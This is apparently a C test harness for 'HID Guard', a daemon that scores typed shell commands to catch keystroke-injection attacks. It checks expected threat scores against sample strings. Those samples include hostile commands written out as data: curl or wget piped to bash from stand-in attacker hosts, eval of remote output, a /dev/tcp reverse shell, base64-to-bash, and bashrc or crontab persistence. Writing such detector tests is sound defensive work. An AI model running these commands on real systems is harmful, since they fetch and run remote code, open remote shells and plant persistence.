#include <stdio.h>
#include <string.h>
#include "../daemon/detector.h"
#include "../daemon/input_handler.h"

#define GREEN "\033[32m"
#define RED "\033[31m"
#define YELLOW "\033[33m"
#define RESET "\033[0m"

void test_command(struct detector_state *state, struct device_info *device, const char *description, const char *command, int expected_score) {
    printf("\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
    printf("TEST: %s\n", description);
    printf("Command: %s\n", command);

    detector_analyze_command(state, device, command);

    if (state->current_score == expected_score) {
        printf(GREEN "✓ PASS" RESET " - Score: %d (expected %d)\n", state->current_score, expected_score);
    } else {
        printf(RED "✗ FAIL" RESET " - Score: %d (expected %d)\n", state->current_score, expected_score);
    }
}

int main(void) {
    struct detector_state detector;
    detector_init(&detector);

    // Create mock device_info for testing
    struct device_info mock_device;
    memset(&mock_device, 0, sizeof(struct device_info));
    mock_device.path = "/dev/input/event-test";
    mock_device.ikt_count = 0;  // No timing samples (no timing-based alerts)
    strcpy(mock_device.product, "Test Device");

    printf("╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║         HID Guard Pattern Detection - Automated Tests           ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n");

    // Test 1: Legitimate command
    test_command(&detector, &mock_device, "Legitimate Command",
                 "ls -al /home/rylan",
                 0);

    // Test 2: Simple download
    test_command(&detector, &mock_device, "Download Command (curl)",
                 "curl http://example.com/file.txt",
                 15);

    // Test 3: wget download
    test_command(&detector, &mock_device, "Download Command (wget)",
                 "wget http://example.com/file.zip",
                 15);

    // Test 4: Piped download (like Docker/Rust installers - legitimate pattern!)
    test_command(&detector, &mock_device, "Piped Download (like curl https://get.docker.com | sh)",
                 "curl http://malicious.com/payload.sh | bash",
                 50);

    // Test 5: Piped download variant
    test_command(&detector, &mock_device, "wget Piped to Shell",
                 "wget -O- http://bad.com/script.sh | sh",
                 50);

    // Test 6: Base64 obfuscation
    test_command(&detector, &mock_device, "Base64 Decode Obfuscation",
                 "echo ZWNobyBtYWxpY2lvdXMK | base64 -d | bash",
                 45);

    // Test 7: Eval with command substitution
    test_command(&detector, &mock_device, "Eval Command Substitution",
                 "eval $(curl http://attacker.com/cmd)",
                 75);

    // Test 8: Reverse shell - ALWAYS malicious
    test_command(&detector, &mock_device, "Reverse Shell Pattern",
                 "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                 100);

    // Test 9: Chmod + execute
    test_command(&detector, &mock_device, "Execution Pattern",
                 "chmod +x malware.sh && ./malware.sh",
                 20);

    // Test 10: Crontab persistence
    test_command(&detector, &mock_device, "Crontab Persistence",
                 "crontab -e",
                 50);

    // Test 11: Bashrc persistence
    test_command(&detector, &mock_device, "Bashrc Persistence",
                 "echo malicious code >> ~/.bashrc",
                 50);

    // Test 12: Command chaining
    test_command(&detector, &mock_device, "Excessive Command Chaining",
                 "cat file | grep pattern | sed 's/a/b/' | awk '{print $1}' | sort",
                 15);

    // Test 13: Complex attack chain (without fast timing)
    test_command(&detector, &mock_device, "Full Attack Chain (no timing)",
                 "curl http://evil.com/payload.sh | bash && chmod +x backdoor && ./backdoor && echo persist >> ~/.bashrc",
                 120);

    // Test 14: Multi-stage attack (without fast timing)
    test_command(&detector, &mock_device, "Multi-Stage Attack (no timing)",
                 "wget http://attacker.com/script.sh && chmod +x script.sh && ./script.sh && crontab -e",
                 85);

    printf(YELLOW "\n\nTesting complete!\n" RESET);


    return 0;
}
